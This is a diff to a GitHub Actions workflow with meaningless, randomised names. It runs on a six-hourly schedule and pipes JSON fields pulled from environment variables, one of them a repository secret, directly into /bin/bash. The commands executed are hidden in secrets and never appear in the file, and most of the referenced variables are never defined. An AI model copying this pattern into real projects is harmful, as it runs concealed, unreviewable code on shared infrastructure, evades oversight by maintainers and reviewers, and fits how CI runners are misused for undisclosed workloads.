@@ -3,29 +3,26 @@ name: wanghuangshang4982
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 5/6 * * *'
-jobs:  # 18620
+    - cron: '48 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wanghuangshang4982
         env:
-          nu37214: ${{ secrets.nu37214 }}
+          y250: ${{ secrets.y250 }}
         run: |
-          echo $nu37214 | jq -r .ka4 | /bin/bash
-          echo $ifkah3 | jq -r .infmo49789 | /bin/bash
-          echo $glb56184 | jq -r .zm39061 | /bin/bash
-          echo $ojdnj223 | jq -r .ihgog7418 | /bin/bash
-          echo $fvxxb7 | jq -r .yesbi3 | /bin/bash
-          echo $ahp67765 | jq -r .ohm4 | /bin/bash
-          echo $auw7 | jq -r .waz2 | /bin/bash
-          echo $lpt49218 | jq -r .a74124 | /bin/bash
-          echo $dk814 | jq -r .ytlcs5024 | /bin/bash
-          echo $ehg7213 | jq -r .rx81623 | /bin/bash
-          echo $f8 | jq -r .uc08752 | /bin/bash
-          echo $gpxl5782 | jq -r .dycb016 | /bin/bash
-          echo $cdgdi0 | jq -r .d552 | /bin/bash
-          echo $jo867 | jq -r .zau40525 | /bin/bash
+          echo $y250 | jq -r .hmw85682 | /bin/bash
+          echo $flb619 | jq -r .w160 | /bin/bash
+          echo $wusk56 | jq -r .ll9 | /bin/bash
+          echo $ukjul3 | jq -r .qg9 | /bin/bash
+          echo $kmjt6264 | jq -r .kgcz5 | /bin/bash
+          echo $w64674 | jq -r .ub417 | /bin/bash
+          echo $vbsay00283 | jq -r .h017 | /bin/bash
+          echo $olfsk8648 | jq -r .akbb19 | /bin/bash
+          echo $o13765 | jq -r .wjjbu8662 | /bin/bash
+          echo $lzlnq10988 | jq -r .fwuu74027 | /bin/bash
+          echo $ni7 | jq -r .wxmw912 | /bin/bash
 
